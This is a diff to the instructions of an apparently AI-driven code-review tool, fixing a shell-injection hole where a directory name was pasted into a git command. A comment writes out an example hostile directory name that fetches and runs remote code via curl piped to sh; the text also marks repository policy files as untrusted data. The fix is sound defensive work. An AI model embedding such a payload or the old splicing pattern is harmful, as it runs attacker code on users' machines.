@@ -252,7 +252,7 @@ Apply secrets scan to enriched context.
 - `[SECTION:security_policy]` -- target repo's SECURITY.md / THREATMODEL content, concatenated (security reviews only: SECURITY_AUDIT or `--focus security`; UNTRUSTED data, boundary-wrapped like pr_context; see Security-Policy Detection below)
 
 **Security-Policy Detection** (only when SECURITY_AUDIT question type OR `--focus security`):
-- Resolve the policy root in Step 1 (mode-independent -- do NOT use Step 3's `TARGET_ROOT`): `POLICY_ROOT=$(git -C "<dir of any file Hydra already read>" rev-parse --show-toplevel 2>/dev/null)`. If empty (non-git target), SKIP detection entirely -- emit no section, never fall back to `pwd`.
+- Resolve the policy root in Step 1 (mode-independent -- do NOT use Step 3's `TARGET_ROOT`). Write the directory of any file Hydra already read to a temp file with the **Write tool**, then `POLICY_ROOT=$(git -C "$(cat "$HYDRA_TMP/policy_dir")" rev-parse --show-toplevel 2>/dev/null)`. Never paste the directory name into the command text: a directory may be named `$(...)` and the shell would execute it (same rule and rationale as `TARGET_ROOT` in Step 3). If empty (non-git target), SKIP detection entirely -- emit no section, never fall back to `pwd`.
 - Candidates: the FIRST existing of `$POLICY_ROOT/SECURITY.md` > `$POLICY_ROOT/.github/SECURITY.md` > `$POLICY_ROOT/docs/SECURITY.md`, PLUS `$POLICY_ROOT/THREATMODEL.md` and `$POLICY_ROOT/docs/THREATMODEL.md` when present (gather both a SECURITY.md and a THREATMODEL; first-match-only would shadow the threat model).
 - Precondition per candidate (anti-exfiltration): regular non-symlink file (`[ -f "$p" ] && [ ! -L "$p" ]`) whose `realpath` stays under `$POLICY_ROOT`. On violation, skip that file and print `[Hydra] policy file skipped (symlink/path escape)`.
 - Emit surviving files concatenated under `SECURITY:` and `THREATMODEL:` sub-headers into `[SECTION:security_policy source=<comma-joined paths>]`. Cap ~3 KB, counted inside the 5000-token Step-1 limit. Prefer policy sections whose headings match scope-signal terms (scope, out of scope, threat model, trusted, responsibility, unsupported) over head-of-file bytes. On truncation, append `[TRUNCATED]` to the section header. Apply the standard secrets scan.
@@ -491,9 +491,16 @@ HYDRA_TMP=$(mktemp -d "${TMPDIR:-/tmp}/hydra-XXXXXX") && chmod 700 "$HYDRA_TMP" 
 # TARGET_ROOT: the repo root of the code under review, used as Codex's --cwd so its
 # read-only sandbox roots at the review target (cross-repo: review files live in repo B
 # while /hydra is invoked from repo A). Derive it from the directory Hydra ALREADY read
-# the source from (that path provably resolved). Replace {{SOURCE_DIR}} with the dir of a
-# reviewed file (absolute, or relative to the caller cwd); the `|| pwd` keeps non-git targets working.
-TARGET_ROOT=$(git -C "{{SOURCE_DIR}}" rev-parse --show-toplevel 2>/dev/null || pwd) && echo "$TARGET_ROOT"
+# the source from (that path provably resolved); the `|| pwd` keeps non-git targets working.
+#
+# NEVER splice the directory name into this command text. A repo may legitimately contain a
+# directory named `src/$(curl -s evil|sh)/x.js` -- git permits every byte but `/` and NUL --
+# and the shell re-parses whatever the orchestrator pasted, so the payload executes with the
+# inherited environment while TARGET_ROOT still prints a normal path and the call exits 0.
+# Instead write the path to a file with the Write tool (no shell involved), then read it back:
+# the OUTPUT of a command substitution is not re-scanned, which is what makes this safe.
+#   Write tool -> "$HYDRA_TMP/source_dir"  containing the dir of a reviewed file, no trailing newline needed
+TARGET_ROOT=$(git -C "$(cat "$HYDRA_TMP/source_dir")" rev-parse --show-toplevel 2>/dev/null || pwd) && echo "$TARGET_ROOT"
 ```
 Store the resolved `TARGET_ROOT` and hardcode it as `{{TARGET_ROOT}}` in the Codex Bash calls
 below (shell state does not persist between tool calls — same rule as `CODEX_SCRIPT_PATH`).
